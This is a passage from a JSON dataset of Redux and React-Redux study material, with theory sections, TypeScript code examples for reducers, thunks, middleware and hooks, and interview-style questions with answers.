              "code": "import { createStore } from 'redux';\n\n// Assume todosReducer is defined as above\nconst store = createStore(todosReducer);\n\n// Dispatch an action to update the state\nstore.dispatch({ type: 'ADD_TODO', payload: 'Buy groceries' });\n\nconsole.log(store.getState()); \n// Expected output: [{ text: 'Buy groceries', completed: false }]\n\nstore.dispatch({ type: 'TOGGLE_TODO', index: 0 });\n\nconsole.log(store.getState());\n// Expected output: [{ text: 'Buy groceries', completed: true }]",
              "explanation": "This example demonstrates how to create a Redux store and use the `dispatch` method to send actions to it. After dispatching, `getState()` can be used to observe the updated state.",
              "language": "typescript"
            },
            {
              "id": "example_redux_core_4",
              "title": "Selector Example",
              "code": "interface RootState { todos: { text: string; completed: boolean; }[]; user: { name: string; }; }\n\n// Assuming a state shape like: { todos: [...], user: {...} }\nconst selectTodos = (state: RootState) => state.todos;\nconst selectCompletedTodos = (state: RootState) => \n  state.todos.filter(todo => todo.completed);\nconst selectUserName = (state: RootState) => state.user.name;\n\n// Usage in a component (conceptual)\n// const todos = useSelector(selectTodos);\n// const completedCount = useSelector(state => selectCompletedTodos(state).length);\n",
              "explanation": "These are examples of simple selector functions. They take the entire Redux state as an argument and return a specific slice of that state or a derived piece of data. Using selectors helps encapsulate state access logic and improve component reusability.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "Redux",
            "State Management",
            "Core Concepts",
            "Architecture"
          ],
          "technology": "TypeScript",
          "prerequisites": [
            "JavaScript Fundamentals",
            "Immutability"
          ],
          "complexity": 6,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "Redux Toolkit",
            "React-Redux",
            "Redux Middleware"
          ]
        },
        {
          "id": "theory_redux_async_patterns",
          "title": "Asynchronous Operations and Common Redux Patterns",
          "content": "Managing asynchronous operations (like API calls) is a common challenge in state management. In Redux, since reducers must be pure and synchronous, asynchronous logic cannot directly reside within them. This necessitates the use of middleware (like Redux Thunk or Redux Saga) to handle side effects.\n\n## ACTION_REQUEST/ACTION_SUCCESS/ACTION_FAILURE Pattern\n\nThe `ACTION_REQUEST`, `ACTION_SUCCESS`, and `ACTION_FAILURE` pattern (sometimes referred to as FSA - Flux Standard Action - for async actions) is a widely adopted convention in Redux applications for managing the lifecycle of asynchronous operations. It breaks down an asynchronous flow into three distinct, dispatchable actions:\n\n-   `REQUEST` (e.g., `FETCH_USER_REQUEST`): This action is dispatched *before* the asynchronous operation begins. Its primary purpose is to signal that a data fetch or other async task has started. UI components can react to this by displaying loading indicators (spinners, skeletons) or disabling interactive elements.\n-   `SUCCESS` (e.g., `FETCH_USER_SUCCESS`): This action is dispatched when the asynchronous operation successfully completes. It typically carries the received data as its payload. UI components can then hide loaders and display the results to the user.\n-   `FAILURE` (e.g., `FETCH_USER_FAILURE`): This action is dispatched if the asynchronous operation encounters an error. It usually carries an error message or error object in its payload. UI components can use this to hide loaders and display an error message to the user.\n\n### Benefits of this pattern:\n1.  **Clear State Transitions**: Provides a clear and predictable way for the UI and state to react to different phases of an async operation.\n2.  **Granular Control**: Allows reducers to manage specific states (e.g., `isLoading`, `data`, `error`) related to the async operation independently.\n3.  **Improved User Experience**: Enables effective display of loading states, success messages, and error notifications, improving the perceived performance and user feedback.\n4.  **Debuggability**: The distinct actions make it easy to trace the flow of asynchronous operations in Redux DevTools.\n\nThis pattern is most often implemented using Redux middleware such as Redux Thunk or Redux Saga, which allow you to dispatch multiple actions over time based on the async operation's progress.",
          "examples": [
            {
              "id": "example_redux_async_1",
              "title": "Reducer Handling Async States",
              "code": "const initialState = {\n  data: null,\n  loading: false,\n  error: null\n};\n\nfunction userReducer(state = initialState, action) {\n  switch (action.type) {\n    case 'FETCH_USER_REQUEST':\n      return { ...state, loading: true, error: null };\n    case 'FETCH_USER_SUCCESS':\n      return { ...state, loading: false, data: action.payload, error: null };\n    case 'FETCH_USER_FAILURE':\n      return { ...state, loading: false, data: null, error: action.payload };\n    default:\n      return state;\n  }\n}",
              "explanation": "This `userReducer` demonstrates how a reducer can manage the `loading`, `data`, and `error` states based on the `REQUEST`, `SUCCESS`, and `FAILURE` actions. Each action type triggers a distinct state update reflecting the current phase of the async operation.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "Redux",
            "Asynchronous Operations",
            "Middleware",
            "State Management Patterns"
          ],
          "technology": "TypeScript",
          "prerequisites": [
            "Redux Core Concepts",
            "JavaScript Promises"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "Redux Thunk",
            "Redux Saga"
          ]
        },
        {
          "id": "theory_redux_middleware",
          "title": "Redux Middleware: Intercepting Actions",
          "content": "## What is Redux Middleware?\nRedux middleware provides a third-party extension point between dispatching an action and the moment it reaches the reducer. Middleware is essentially a function that wraps the store's `dispatch` method, allowing you to intercept, inspect, modify, or even halt dispatched actions. This mechanism is powerful for handling side effects (like asynchronous API calls, logging, routing, etc.) without cluttering your action creators or reducers.\n\nA middleware pipeline typically looks like this:\n`action -> middleware 1 -> middleware 2 -> ... -> reducer`\n\nEach middleware receives `store.dispatch` and `store.getState` as arguments, allowing it to interact with the store. It then returns a function that takes `next` (the next middleware in the chain, or the actual `dispatch` method if it's the last one) and returns another function that takes the `action`.\n\n## Why Use Middleware?\nReducers must be pure functions, meaning they cannot perform side effects (like network requests, logging to console, generating random numbers, or interacting with browser storage). Middleware steps in to handle these side effects. Common use cases for Redux middleware include:\n\n-   **Asynchronous operations**: Making API calls (e.g., Redux Thunk, Redux Saga, Redux Observable).\n-   **Logging**: Logging dispatched actions and the resulting state changes (e.g., Redux Logger).\n-   **Routing**: Synchronizing application state with URL changes (e.g., Connected React Router).\n-   **Crash reporting**: Sending error reports.\n-   **Data normalization**: Transforming API responses before they hit reducers.\n\n## Common Redux Middleware\n\n### Redux Thunk\n**Redux Thunk** is a popular and relatively simple middleware that allows action creators to return a function instead of a plain action object. This function receives `dispatch` and `getState` as arguments, enabling it to perform asynchronous logic and dispatch multiple actions over time.\n\n**Key Features:**\n-   Handles simple asynchronous logic.\n-   Allows conditional dispatching based on current state.\n-   Delays dispatching of actions.\n\n**Use Case**: Ideal for simple API calls or any asynchronous logic that requires access to `dispatch` and `getState`.\n\n### Redux Saga\n**Redux Saga** is a more powerful and complex middleware for managing complex side effects. It uses ES6 Generators to make asynchronous flows easy to test, and better at handling concurrency, race conditions, and cancellation. Sagas run in the background, listening for dispatched actions.\n\n**Use Case**: Suitable for applications with complex, long-running, or highly concurrent asynchronous logic (e.g., WebSocket interactions, complex authentication flows).\n\n### Redux Logger\n**Redux Logger** is a development-only middleware that logs all Redux actions and the state changes that occur in response. It's incredibly useful for debugging by providing a clear console output of what's happening in your store.\n\n## How Middleware Works (Simplified)\nWhen you create your Redux store, you apply middleware using `applyMiddleware`:\n```javascript\nimport { createStore, applyMiddleware } from 'redux';\nimport thunk from 'redux-thunk';\nimport logger from 'redux-logger';\nimport rootReducer from './reducers';\n\nconst store = createStore(\n  rootReducer,\n  applyMiddleware(thunk, logger) // Middleware applied here\n);\n```\nActions dispatched via `store.dispatch()` or `useDispatch()` will first pass through `thunk`, then `logger`, before finally reaching the `rootReducer`.",
          "examples": [
            {
              "id": "example_redux_middleware_1",
              "title": "Redux Thunk Example",
              "code": "import axios from 'axios';\n\nconst FETCH_USER_REQUEST = 'FETCH_USER_REQUEST';\nconst FETCH_USER_SUCCESS = 'FETCH_USER_SUCCESS';\nconst FETCH_USER_FAILURE = 'FETCH_USER_FAILURE';\n\nconst fetchUserRequest = () => ({ type: FETCH_USER_REQUEST });\nconst fetchUserSuccess = (data) => ({ type: FETCH_USER_SUCCESS, payload: data });\nconst fetchUserFailure = (error) => ({ type: FETCH_USER_FAILURE, payload: error });\n\nfunction fetchUserData(userId: string) {\n  return async (dispatch, getState) => {\n    dispatch(fetchUserRequest()); // Dispatch request action\n    \n    try {\n      const response = await axios.get(`https://api.example.com/users/${userId}`);\n      dispatch(fetchUserSuccess(response.data)); // Dispatch success action\n    } catch (error: any) {\n      dispatch(fetchUserFailure(error.message)); // Dispatch failure action\n    }\n  };\n}",
              "explanation": "This `fetchUserData` action creator is a Redux Thunk. Instead of returning a plain object, it returns an asynchronous function that receives `dispatch` and `getState`. This allows it to perform an API call (`axios.get`) and dispatch different actions (`REQUEST`, `SUCCESS`, `FAILURE`) based on the outcome of the asynchronous operation, following the common async pattern.",
              "language": "typescript"
            },
            {
              "id": "example_redux_middleware_2",
              "title": "Applying Middleware to Store",
              "code": "import { createStore, applyMiddleware, combineReducers } from 'redux';\nimport { thunk } from 'redux-thunk'; // In newer Redux Thunk, 'thunk' is named export\nimport logger from 'redux-logger';\n\n// Dummy reducer\nfunction appReducer(state = { count: 0 }, action) {\n  switch (action.type) {\n    case 'INCREMENT': return { ...state, count: state.count + 1 };\n    default: return state;\n  }\n}\n\nconst rootReducer = combineReducers({ app: appReducer });\n\n// Create store with middleware\nconst store = createStore(\n  rootReducer,\n  applyMiddleware(thunk, logger)\n);\n\n// Example dispatch of a thunk (conceptual)\n// store.dispatch(fetchUserData('123'));\n// store.dispatch({ type: 'INCREMENT' });\n",
              "explanation": "This example shows how `applyMiddleware` is used during store creation to integrate Redux Thunk and Redux Logger into the Redux store's dispatch pipeline. Any action dispatched will pass through these middleware functions before reaching the reducers.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "Redux",
            "Middleware",
            "Redux Thunk",
            "Redux Saga",
            "Asynchronous",
            "Side Effects"
          ],
          "technology": "TypeScript",
          "prerequisites": [
            "Redux Core Concepts",
            "JavaScript Functions",
            "Asynchronous JavaScript"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "Complex Redux Applications",
            "API Integration"
          ]
        },
        {
          "id": "theory_redux_data_flow",
          "title": "Unidirectional Data Flow in Redux",
          "content": "Redux enforces a strict unidirectional data flow, often visualized as a cycle. This predictable flow makes it easier to understand how state changes, debug issues, and manage the complexity of large applications.\n\n## Steps of Redux Data Flow\n\n1.  **User Interaction / Event**: The data flow begins with a user interaction (e.g., clicking a button, typing in an input field) or an external event (e.g., an API response, a WebSocket message).\n\n2.  **Action Dispatch**: As a result of the interaction, an **Action Creator** constructs an **Action** (a plain JavaScript object describing 'what happened'). This action is then sent to the Redux **Store** using the `dispatch` method.\n    -   *Example*: `store.dispatch(addTodo('Learn Redux'))`\n\n3.  **Middleware Processing (Optional)**: If any **Middleware** is configured (e.g., Redux Thunk for async operations, Redux Logger for debugging), the dispatched action will pass through it first. Middleware can inspect, modify, delay, or even cancel the action, and can dispatch additional actions.\n\n4.  **Root Reducer**: The action (possibly modified by middleware) reaches the **Root Reducer**. The root reducer, which is typically a combination of smaller, specialized reducers (one per state slice), decides which specific **Reducer** functions need to handle the action.\n\n5.  **State Update by Reducers**: The relevant reducers receive the current `state` and the `action`. They compute the *new state* based on the action's `type` and `payload`, ensuring immutability by returning new state objects rather than modifying the existing one. If no state change is needed for a given action, the reducer returns the current state.\n    -   *Example*: `todosReducer(currentState.todos, action) => newTodosState`\n\n6.  **Store State Update**: The Redux **Store** updates its internal state with the new state returned by the root reducer.\n\n7.  **Subscribers Notified**: Any components or functions that have `subscribe`d to the store, or are connected via `react-redux` (`connect` or `useSelector`), are notified that the state has changed.\n\n8.  **UI Re-rendering**: Connected UI components re-render if the relevant slice of state they are subscribed to has changed. This is often optimized by libraries like React-Redux to only re-render components that genuinely need updates.\n\nThis cycle ensures that all state changes originate from actions, are processed by pure reducers, and result in a new, immutable state, leading to highly predictable application behavior.\n\n",
          "examples": [],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "Redux",
            "Data Flow",
            "Architecture",
            "Unidirectional",
            "State Management"
          ],
          "technology": "TypeScript",
          "prerequisites": [
            "Redux Core Concepts",
            "Redux Middleware"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "Debugging Redux",
            "Designing Redux Architecture"
          ]
        },
        {
          "id": "theory_react_redux_integration",
          "title": "Connecting Redux with React Components",
          "content": "To integrate Redux with React applications, the `react-redux` library is typically used. It provides bindings that allow your React components to read data from the Redux store and dispatch actions to it, abstracting away the direct interaction with `store.subscribe()` and `store.dispatch()`.\n\n## Providing the Store\n\nThe first step is to make the Redux store available to your React component tree. This is done using the `<Provider>` component from `react-redux` at the root of your application:\n\n```tsx\nimport React from 'react';\nimport ReactDOM from 'react-dom/client';\nimport { Provider } from 'react-redux';\nimport { store } from './app/store'; // Your Redux store\nimport App from './App';\n\nconst root = ReactDOM.createRoot(document.getElementById('root') as HTMLElement);\nroot.render(\n  <React.StrictMode>\n    <Provider store={store}>\n      <App />\n    </Provider>\n  </React.StrictMode>\n);\n```\n\n## Connecting Components (Class Components)\n\nFor class components, `react-redux` provides the `connect` higher-order component (HOC). `connect` is a function that takes two optional arguments, `mapStateToProps` and `mapDispatchToProps`, and returns a new function. This new function then takes your React component and returns a 'connected' component.\n\n```tsx\nimport React from 'react';\nimport { connect } from 'react-redux';\nimport { addTodo, toggleTodo } from './actions'; // Action creators\n\nclass TodoApp extends React.Component<{ todos: any[], addTodo: (text: string) => void, toggleTodo: (index: number) => void }> {\n  render() {\n    return (\n      <div>\n        <h1>Todos</h1>\n        <input \n          type=\"text\" \n          onKeyPress={(e) => {\n            if (e.key === 'Enter') {\n              this.props.addTodo((e.target as HTMLInputElement).value);\n              (e.target as HTMLInputElement).value = '';\n            }\n          }}\n          placeholder=\"Add a new todo\"\n        />\n        <ul>\n          {this.props.todos.map((todo, index) => (\n            <li key={index} onClick={() => this.props.toggleTodo(index)}>\n              {todo.text} {todo.completed ? '(Completed)' : ''}\n            </li>\n          ))}\n        </ul>\n      </div>\n    );\n  }\n}\n\n// mapStateToProps: Defines which parts of the Redux state your component needs\nconst mapStateToProps = (state: any) => ({ \n  todos: state.todos // Assuming your root state has a 'todos' slice\n});\n\n// mapDispatchToProps: Defines which actions your component can dispatch\n// Option 1: Manual mapping - Most verbose, offers full control over dispatch logic.\n//           Useful if you need to transform dispatch props or perform side effects.\nconst mapDispatchToPropsOption1 = (dispatch: any) => ({\n  addTodo: (text: string) => dispatch(addTodo(text)),\n  toggleTodo: (index: number) => dispatch(toggleTodo(index)),\n  // You can also add custom dispatch logic here\n  logAction: (actionType: string) => {\n    console.log(`Action dispatched: ${actionType}`);\n    dispatch({ type: actionType });\n  }\n});\n\n// Option 2: Object shorthand - The most common and concise way.\n//           If an action creator is passed as a value, `connect` automatically wraps it in `dispatch`.\nconst mapDispatchToPropsOption2 = {\n  addTodo,   // Equivalent to (text) => dispatch(addTodo(text))\n  toggleTodo // Equivalent to (index) => dispatch(toggleTodo(index))\n};\n\n// Connect the component to Redux\n// You can choose either mapDispatchToPropsOption1 or mapDispatchToPropsOption2\nexport default connect(mapStateToProps, mapDispatchToPropsOption2)(TodoApp);\n```\n\n## Connecting Components (Functional Components with Hooks)\n\nFor functional components, `react-redux` provides hooks (`useSelector` and `useDispatch`), which are the recommended approach for new applications. They offer a simpler and more direct way to interact with the store.\n\n```tsx\nimport React from 'react';\nimport { useSelector, useDispatch } from 'react-redux';\nimport { addTodo, toggleTodo } from './actions'; // Action creators\n\ninterface Todo { text: string; completed: boolean; }\ninterface RootState { todos: Todo[]; }\n\nfunction FunctionalTodoApp() {\n  // useSelector: Extracts data from the Redux store state\n  const todos = useSelector((state: RootState) => state.todos);\n  \n  // useDispatch: Returns a reference to the store's dispatch function\n  const dispatch = useDispatch();\n\n  const handleAddTodo = (e: React.KeyboardEvent<HTMLInputElement>) => {\n    if (e.key === 'Enter') {\n      dispatch(addTodo((e.target as HTMLInputElement).value));\n      (e.target as HTMLInputElement).value = '';\n    }\n  };\n\n  const handleToggleTodo = (index: number) => {\n    dispatch(toggleTodo(index));\n  };\n\n  return (\n    <div>\n      <h1>Functional Todos</h1>\n      <input \n        type=\"text\" \n        onKeyPress={handleAddTodo}\n        placeholder=\"Add a new todo\"\n      />\n      <ul>\n        {todos.map((todo, index) => (\n          <li key={index} onClick={() => handleToggleTodo(index)}>\n            {todo.text} {todo.completed ? '(Completed)' : ''}\n          </li>\n        ))}\n      </ul>\n    </div>\n  );\n}\n\nexport default FunctionalTodoApp;\n```\n\n### `useSelector` vs `mapStateToProps`\n-   `useSelector` allows you to directly select a slice of state in your functional component. It automatically subscribes to the Redux store and re-renders the component when the selected state changes. It takes a selector function as its argument.\n-   `mapStateToProps` is a function that maps parts of the Redux state to component props for class components. It returns an object that gets merged into the component's props.\n\n### `useDispatch` vs `mapDispatchToProps`\n-   `useDispatch` returns a reference to the `dispatch` function from the Redux store. You can then call `dispatch(actionCreator(args))` directly within your functional component.\n-   `mapDispatchToProps` maps action creators to component props for class components. It can be an object (shorthand for binding action creators) or a function that receives `dispatch` as an argument.",
          "examples": [],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "React",
            "Redux",
            "React-Redux",
            "Hooks",
            "connect HOC",
            "State Management"
          ],
          "technology": "TypeScript",
          "prerequisites": [
            "Redux Core Concepts",
            "React Fundamentals",
            "React Hooks"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "Building React Redux Apps"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_redux_core_1",
          "topic": "Redux Core Concepts",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary role of the Redux Store?",
          "answer": "The Redux Store is a single source of truth that holds the entire application state.",
          "options": [],
          "analysisPoints": [
            "Defines the Store as the central state container.",
            "Emphasizes the 'single source of truth' principle."
          ],
          "keyConcepts": [
            "Redux Store",
            "State Management",
            "Single Source of Truth"
          ],
          "evaluationCriteria": [
            "Basic recall",
            "Understanding of Redux architecture"
          ],
          "example": "",
          "tags": [
            "Redux",
            "Core Concepts",
            "Store"
          ],
          "prerequisites": [],
          "complexity": 2,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_redux_core_2",
          "topic": "Actions and Reducers",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following statements about Redux actions and reducers is TRUE?",
          "answer": "Reducers are pure functions that take the previous state and an action, returning the next state without mutating the original state.",
          "options": [
            "Actions are functions that modify the state directly.",
            "Reducers can perform side effects like API calls.",
            "Actions must always have a `payload` property.",
            "Reducers are pure functions that take the previous state and an action, returning the next state without mutating the original state."
          ],
          "analysisPoints": [
            "Tests understanding of immutability in reducers.",
            "Distinguishes between actions (plain objects) and action creators (functions).",
            "Confirms that reducers must be pure and have no side effects.",
            "Clarifies that `payload` is common but not mandatory for all actions."
          ],
          "keyConcepts": [
            "Actions",
            "Reducers",
            "Pure Functions",
            "Immutability"
          ],
          "evaluationCriteria": [
            "Understanding of fundamental Redux principles.",
            "Ability to identify incorrect statements about core concepts."
          ],
          "example": "Reducers are required to be pure functions. This means they should not modify their arguments, perform API calls, or access global variables outside their scope. They only depend on their input arguments (previous state and action) to produce the new state. Immutability is critical to ensure predictable state changes and facilitate features like time-travel debugging.",
          "tags": [
            "Redux",
            "Actions",
            "Reducers",
            "Immutability",
            "Pure Functions"
          ],
          "prerequisites": [
            "Redux Core Concepts"
          ],
          "complexity": 5,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_redux_core_3",
          "topic": "Redux Data Flow",
          "level": "medium",
          "type": "open",
          "question": "Describe the unidirectional data flow in a Redux application, starting from a user interaction and ending with the UI update.",
          "answer": "The unidirectional data flow in Redux follows a strict cycle:\n1.  **User Interaction**: A user interacts with the UI (e.g., clicks a button, types text).\n2.  **Action Dispatch**: The UI dispatches an action (a plain JS object) via `store.dispatch()`. This action describes 'what happened'.\n3.  **Middleware (Optional)**: The action might pass through Redux middleware (e.g., Redux Thunk for async operations, Redux Logger for logging) before reaching reducers. Middleware can intercept, modify, or trigger side effects.\n4.  **Reducer Processing**: The dispatched action reaches the root reducer. The root reducer delegates the action to the appropriate slice reducers.\n5.  **State Update**: Reducers (pure functions) take the current state and the action, and return a *new* state object, ensuring immutability.\n6.  **Store Update**: The Redux store updates its state with the new state returned by the reducers.\n7.  **Subscribers Notified**: Components or functions subscribed to the store (e.g., via `react-redux`) are notified of the state change.\n8.  **UI Re-render**: React components connected to the relevant parts of the state re-render to reflect the updated state.",
          "options": [],
          "analysisPoints": [
            "Covers all main steps of the Redux data flow.",
            "Highlights the role of each Redux concept (Actions, Dispatch, Middleware, Reducers, Store, UI).",
            "Emphasizes the 'unidirectional' aspect and immutability."
          ],
          "keyConcepts": [
            "Redux Data Flow",
            "Unidirectional",
            "Actions",
            "Dispatch",
            "Reducers",
            "Middleware",
            "Store",
            "UI Update"
          ],
          "evaluationCriteria": [
            "Completeness of description.",
            "Accuracy of each step in the data flow.",
            "Clarity and logical progression."
          ],
          "example": "",
          "tags": [
            "Redux",
            "Data Flow",
            "Architecture"
          ],
          "prerequisites": [
            "Redux Core Concepts",
            "Redux Middleware"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_redux_async_1",
          "topic": "Async Action Patterns",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following reducer state for an asynchronous operation:\n```javascript\nconst initialState = {\n  data: null,\n  loading: false,\n  error: null\n};\n```\nWhich action type should set `loading` to `true` and `error` to `null` to prepare for a new fetch?",
          "answer": "`ACTION_REQUEST`",
          "options": [
            "`ACTION_SUCCESS`",
            "`ACTION_FAILURE`",
            "`ACTION_COMPLETE`",
            "`ACTION_REQUEST`"
          ],
          "analysisPoints": [
            "Tests understanding of the `REQUEST/SUCCESS/FAILURE` pattern.",
            "Identifies the role of the `REQUEST` action in initiating an async operation and resetting error states."
          ],
          "keyConcepts": [
            "Asynchronous Actions",
            "Redux Patterns",
            "State Management"
          ],
          "evaluationCriteria": [
            "Knowledge of common Redux async patterns.",
            "Ability to deduce state transitions based on action types."
          ],
          "example": "The `ACTION_REQUEST` type is dispatched when an asynchronous operation begins. Its purpose is to indicate that data is being fetched, hence `loading` should be set to `true`. It also typically clears any previous errors by setting `error` to `null`, ensuring a clean slate for the new operation.",
          "tags": [
            "Redux",
            "Async",
            "Patterns"
          ],
          "prerequisites": [
            "Redux Core Concepts"
          ],
          "complexity": 4,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_redux_middleware_1",
          "topic": "Redux Middleware",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary purpose of Redux middleware?",
          "answer": "Redux middleware intercepts actions before they reach reducers, allowing for side effects, asynchronous operations, logging, etc.",
          "options": [],
          "analysisPoints": [
            "Defines middleware as an interception point.",
            "Lists common use cases like side effects and async operations."
          ],
          "keyConcepts": [
            "Redux Middleware",
            "Side Effects",
            "Asynchronous Operations"
          ],
          "evaluationCriteria": [
            "Basic recall",
            "Understanding of middleware's role"
          ],
          "example": "",
          "tags": [
            "Redux",
            "Middleware"
          ],
          "prerequisites": [
            "Redux Core Concepts"
          ],
          "complexity": 3,
          "interviewFrequency": 8,
          "learningPath": "beginner"
        },
        {
          "id": "question_redux_middleware_2",
          "topic": "Redux Thunk",
          "level": "medium",
          "type": "code",
          "question": "Complete the `loginUser` thunk action creator below so that it dispatches `LOGIN_REQUEST` before an API call, `LOGIN_SUCCESS` with user data on success, and `LOGIN_FAILURE` with an error message on failure. Assume `api.login(credentials)` returns a Promise.",
          "answer": "```typescript\nimport api from './api'; // Assume this exports an object with a login method\n\nconst LOGIN_REQUEST = 'LOGIN_REQUEST';\nconst LOGIN_SUCCESS = 'LOGIN_SUCCESS';\nconst LOGIN_FAILURE = 'LOGIN_FAILURE';\n\ninterface UserCredentials { username: string; password: string; }\ninterface UserData { id: string; name: string; email: string; }\n\nconst loginRequest = () => ({ type: LOGIN_REQUEST });\nconst loginSuccess = (user: UserData) => ({ type: LOGIN_SUCCESS, payload: user });\nconst loginFailure = (error: string) => ({ type: LOGIN_FAILURE, payload: error });\n\nfunction loginUser(credentials: UserCredentials) {\n  return async (dispatch: any) => {\n    dispatch(loginRequest());\n    try {\n      const response = await api.login(credentials);\n      dispatch(loginSuccess(response.data));\n    } catch (error: any) {\n      dispatch(loginFailure(error.message || 'Login failed'));\n    }\n  };\n}\n```",
          "options": [],
          "analysisPoints": [
            "Tests understanding of Redux Thunk's structure (returning a function).",
            "Evaluates the ability to use `dispatch` inside a thunk.",
            "Checks for correct implementation of the `REQUEST/SUCCESS/FAILURE` pattern for async operations.",
            "Assesses error handling within asynchronous code."
          ],
          "keyConcepts": [
            "Redux Thunk",
            "Asynchronous Actions",
            "Middleware",
            "Error Handling",
            "Action Dispatch"
          ],
          "evaluationCriteria": [
            "Correct use of async/await within the thunk.",
            "Accurate dispatching of all three action types.",
            "Proper payload handling for success and failure.",
            "Robust error handling."
          ],
          "example": "```typescript\nimport api from './api'; // Assume this exports an object with a login method\n\nconst LOGIN_REQUEST = 'LOGIN_REQUEST';\nconst LOGIN_SUCCESS = 'LOGIN_SUCCESS';\nconst LOGIN_FAILURE = 'LOGIN_FAILURE';\n\ninterface UserCredentials { username: string; password: string; }\ninterface UserData { id: string; name: string; email: string; }\n\nconst loginRequest = () => ({ type: LOGIN_REQUEST });\nconst loginSuccess = (user: UserData) => ({ type: LOGIN_SUCCESS, payload: user });\nconst loginFailure = (error: string) => ({ type: LOGIN_FAILURE, payload: error });\n\nfunction loginUser(credentials: UserCredentials) {\n  return async (dispatch: any) => {\n    dispatch(loginRequest()); // Indicate that login has started\n    try {\n      const response = await api.login(credentials);\n      dispatch(loginSuccess(response.data)); // Dispatch success with user data\n    } catch (error: any) {\n      dispatch(loginFailure(error.message || 'Login failed')); // Dispatch failure with error message\n    }\n  };\n}\n```",
          "tags": [
            "Redux",
            "Thunk",
            "Async",
            "Coding",
            "Middleware"
          ],
          "prerequisites": [
            "Redux Core Concepts",
            "JavaScript Promises",
            "Async/Await"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_redux_react_1",
          "topic": "Connecting Redux with React",
          "level": "medium",
          "type": "mcq",
          "question": "Which `react-redux` hook is primarily used by functional components to select and extract data from the Redux store's state?",
          "answer": "`useSelector`",
          "options": [
            "`useDispatch`",
            "`useStore`",
            "`useReducer`",
            "`useSelector`"
          ],
          "analysisPoints": [
            "Tests knowledge of `react-redux` hooks.",
            "Distinguishes `useSelector` (for state extraction) from `useDispatch` (for dispatching actions)."
          ],
          "keyConcepts": [
            "React-Redux",
            "Hooks",
            "useSelector",
            "State Selection"
          ],
          "evaluationCriteria": [
            "Correct identification of `react-redux` hooks.",
            "Understanding of each hook's specific purpose."
          ],
          "example": "The `useSelector` hook allows you to extract data from the Redux store state directly within a functional component. It takes a selector function as an argument, which receives the Redux state and returns the desired slice of data. `useSelector` also handles subscribing to the store and re-rendering the component when the selected data changes.",
          "tags": [
            "React",
            "Redux",
            "Hooks",
            "useSelector"
          ],
          "prerequisites": [
            "React Hooks",
            "Redux Core Concepts"
          ],
          "complexity": 4,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_redux_react_2",
          "topic": "mapDispatchToProps",
          "level": "medium",
          "type": "open",
          "question": "Explain the three common ways to implement `mapDispatchToProps` when using `connect` with class components in React-Redux. Provide a brief example for each.",
          "answer": "There are three common ways to implement `mapDispatchToProps`:\n\n1.  **Function (Manual Mapping)**: This is the most verbose but offers the most control. `mapDispatchToProps` is a function that receives `dispatch` as its first argument. It should return an object where keys are prop names and values are functions that dispatch actions.\n    ```javascript\n    const mapDispatchToProps = (dispatch) => ({\n      addTodo: (text) => dispatch({ type: 'ADD_TODO', payload: text }),\n      fetchUser: (id) => dispatch(fetchUserThunk(id)) // Can dispatch thunks\n    });\n    ```\n2.  **Object Shorthand**: This is the most concise and recommended approach when you simply want to bind action creators to `dispatch`. You pass an object where keys are prop names and values are action creator functions. `connect` automatically wraps each action creator in `dispatch`.\n    ```javascript\n    import { addTodo, fetchUserThunk } from './actions';\n    const mapDispatchToProps = {\n      addTodo, // Becomes this.props.addTodo(text) -> dispatch(addTodo(text))\n      fetchUser: fetchUserThunk // Becomes this.props.fetchUser(id) -> dispatch(fetchUserThunk(id))\n    };\n    ```\n3.  **Omitting `mapDispatchToProps`**: If you omit the second argument to `connect`, your component will receive `dispatch` as a prop directly. This means you'll have to manually call `this.props.dispatch(actionCreator())` inside your component. This is generally less preferred for maintainability as it couples component logic directly to `dispatch`.\n    ```javascript\n    // In connect: connect(mapStateToProps)(MyComponent)\n    // In component: this.props.dispatch(addTodo('New task'));\n    ```",
          "options": [],
          "analysisPoints": [
            "Details all three options for `mapDispatchToProps`.",
            "Explains the purpose and use case for each method.",
            "Provides clear, concise code examples for illustration.",
            "Compares the verbosity and control offered by each approach."
          ],
          "keyConcepts": [
            "React-Redux",
            "connect HOC",
            "mapDispatchToProps",
            "Action Creators",
            "Dispatching Actions"
          ],
          "evaluationCriteria": [
            "Comprehensive explanation of each method.",
            "Accuracy of code examples.",
            "Understanding of when to use each approach."
          ],
          "example": "",
          "tags": [
            "React",
            "Redux",
            "mapDispatchToProps",
            "connect HOC"
          ],
          "prerequisites": [
            "React-Redux Integration",
            "Redux Core Concepts"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_redux_pure_reducers_1",
          "topic": "Reducers: Purity and Immutability",
          "level": "hard",
          "type": "code",
